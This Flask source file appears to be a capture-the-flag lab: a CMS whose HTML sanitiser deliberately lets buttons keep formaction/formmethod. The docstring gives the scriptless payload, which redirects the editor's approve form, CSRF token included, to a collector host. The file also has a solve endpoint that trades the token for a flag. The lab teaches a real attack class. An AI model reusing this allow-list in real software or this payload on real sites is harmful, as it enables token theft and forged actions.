# SPDX-License-Identifier: MIT
"""FormFlow — a lightweight CMS where contributors draft "content blocks" (rich
HTML, including a call-to-action <button>) and an editor reviews each draft before
publishing. Drafts are sanitised with an allow-list (nh3/ammonia) that strips
scripts, event handlers and javascript: URIs — but the allow-list was written to
permit a styled CTA <button> and, with it, the HTML5 `formaction`/`formmethod`
attributes. Those attributes let a <button> OVERRIDE the target of the form it
sits in.

The editor reviews a draft on GET /admin/review, which renders the draft INSIDE
the "approve" form — a form that carries the editor's anti-CSRF token in a hidden
field and, having no `action`, submits to the current URL by default. The editor
bot (the shared xss-verifier headless Chromium, configured with
XSSBOT_CLICK_SELECTOR) clicks the draft's CTA button to preview it. A CTA button
carrying `formaction="http://collector:9000/report" formmethod="post"` overrides
the form target, so that click sends the whole form body — including the CSRF
token — to the collector. No JavaScript is involved at all.

Recover the token via GET /oob/received and POST /solve.
"""
import collections
import hmac
import ipaddress
import json
import os
import urllib.request

import nh3
from flask import Flask, Response, request

FLAG_PATH = os.environ.get("FLAG_PATH", "/var/lib/lab/flag.txt")
ADMIN_SESSION = os.environ.get("ADMIN_SESSION", "")
ADMIN_CSRF = os.environ.get("ADMIN_CSRF", "")
BOT_KEY = os.environ.get("BOT_KEY", "")
OOB_HOST = os.environ.get("OOB_HOST", "collector")
OOB_PORT = int(os.environ.get("OOB_PORT", "9000"))
BACKEND_CIDR = os.environ.get("BACKEND_CIDR", "172.31.240.0/24")
MAX_BLOCKS = 32

app = Flask(__name__)
_blocks: collections.deque = collections.deque(maxlen=MAX_BLOCKS)

# The allow-list sanitiser. It correctly strips <script>, event-handler
# attributes (onclick/onerror/…) and javascript: URIs — a benign <script> or
# <img onerror> draft is neutralised and never fires. The DELIBERATE flaw is that
# <button> is allowed to keep `formaction` and `formmethod`: URL-bearing
# attributes that override where the enclosing form submits. nh3 still scrubs a
# `formaction="javascript:…"` (bad scheme), so the only thing that gets through is
# the scriptless form-target override to an http(s) origin — which is the lesson.
SANITISE_TAGS = {
    "p", "br", "b", "i", "strong", "em", "u", "span", "div",
    "h1", "h2", "h3", "ul", "ol", "li", "a", "button",
}
SANITISE_ATTRS = {
    "a": {"href", "title"},
    "span": {"class"},
    "div": {"class"},
    "button": {"type", "class", "name", "value", "formaction", "formmethod"},
}


def sanitise(html: str) -> str:
    return nh3.clean(html, tags=SANITISE_TAGS, attributes=SANITISE_ATTRS)


def _from_backend() -> bool:
    try:
        return ipaddress.ip_address(request.remote_addr or "") in ipaddress.ip_network(BACKEND_CIDR)
    except ValueError:
        return False


def _is_admin() -> bool:
    return bool(ADMIN_SESSION) and hmac.compare_digest(
        request.cookies.get("session", ""), ADMIN_SESSION
    )


HOME = (
    "<!doctype html><html><head><title>FormFlow</title></head><body>"
    "<h1>FormFlow</h1>"
    "<p>Draft a content block in rich HTML (a styled call-to-action "
    "<code>&lt;button&gt;</code> is supported). An editor reviews each draft "
    "before publishing.</p>"
    "<p><code>POST /blocks</code> with JSON <code>{\"html\":\"…\"}</code> "
    "or a form field <code>html</code>.</p>"
    "</body></html>"
)


@app.get("/health")
def health() -> Response:
    return Response("ok", mimetype="text/plain")


@app.get("/")
def home() -> Response:
    return Response(HOME, mimetype="text/html")


@app.post("/blocks")
def create_block() -> Response:
    html = ""
    if request.is_json:
        html = str((request.get_json(silent=True) or {}).get("html", ""))
    if not html:
        html = request.form.get("html", "")
    html = html.strip()
    if not html:
        return Response(json.dumps({"ok": False, "error": "html required"}),
                        mimetype="application/json", status=400)
    block_id = "b%d" % (len(_blocks) + 1)
    _blocks.append({"id": block_id, "html": sanitise(html)})
    return Response(json.dumps({"ok": True, "id": block_id, "count": len(_blocks)}),
                    mimetype="application/json")


def _review_page(block: dict | None) -> str:
    draft = block["html"] if block else "<p>No drafts pending.</p>"
    block_id = block["id"] if block else "-"
    # The approve form has NO action → submits to /admin/review (current URL) by
    # default, and carries the editor's CSRF token. The draft (with its CTA
    # button) is rendered INSIDE it; the editor clicks the CTA to preview it.
    return (
        "<!doctype html><html><head><title>Review draft</title></head><body>"
        "<h1>Review draft %s</h1>"
        "<form method=\"post\">"
        "<input type=\"hidden\" name=\"csrf\" value=\"%s\">"
        "<input type=\"hidden\" name=\"block_id\" value=\"%s\">"
        "<div class=\"draft\">%s</div>"
        "<p><button type=\"submit\" name=\"decision\" value=\"approve\">Approve draft</button></p>"
        "</form>"
        "</body></html>"
    ) % (block_id, ADMIN_CSRF, block_id, draft)


@app.get("/admin/review")
def admin_review() -> Response:
    if not _is_admin():
        return Response("forbidden — editors only", status=403, mimetype="text/plain")
    latest = _blocks[-1] if _blocks else None
    return Response(_review_page(latest), mimetype="text/html")


@app.post("/admin/review")
def admin_approve() -> Response:
    """The form's legitimate target: approve a draft. Requires the admin session
    AND a matching CSRF token — which is exactly why that token is worth stealing."""
    if not _is_admin():
        return Response("forbidden — editors only", status=403, mimetype="text/plain")
    if not ADMIN_CSRF or not hmac.compare_digest(request.form.get("csrf", ""), ADMIN_CSRF):
        return Response("CSRF check failed", status=403, mimetype="text/plain")
    return Response("draft %s approved" % request.form.get("block_id", "-"),
                    mimetype="text/plain")


@app.get("/internal/bot-login")
def bot_login() -> Response:
    if not _from_backend():
        return Response("forbidden", status=403, mimetype="text/plain")
    if not BOT_KEY or request.args.get("k", "") != BOT_KEY:
        return Response("forbidden", status=403, mimetype="text/plain")
    resp = Response("logged in", mimetype="text/plain")
    resp.set_cookie("session", ADMIN_SESSION, httponly=True, samesite="Lax")
    return resp


@app.get("/oob/received")
def oob_received() -> Response:
    try:
        with urllib.request.urlopen(f"http://{OOB_HOST}:{OOB_PORT}/received", timeout=5) as r:
            body = r.read()
    except Exception as e:  # noqa: BLE001
        return Response(json.dumps({"ok": False, "error": str(e)}),
                        mimetype="application/json", status=502)
    return Response(body, mimetype="application/json")


@app.post("/solve")
def solve() -> Response:
    body = request.get_json(silent=True) or {}
    submitted = str(body.get("c", "")).strip()
    # Accept a bare token or a full `csrf=<value>` form fragment.
    if submitted.startswith("csrf="):
        submitted = submitted[len("csrf="):]
    if "&" in submitted:
        submitted = submitted.split("&", 1)[0]
    if ADMIN_CSRF and hmac.compare_digest(submitted, ADMIN_CSRF):
        try:
            with open(FLAG_PATH, encoding="utf-8") as fh:
                flag = fh.read().strip()
        except OSError:
            flag = "(flag unavailable)"
        return Response(json.dumps({"ok": True, "flag": flag}), mimetype="application/json")
    return Response(json.dumps({"ok": False, "error": "that is not the admin CSRF token"}),
                    mimetype="application/json", status=403)
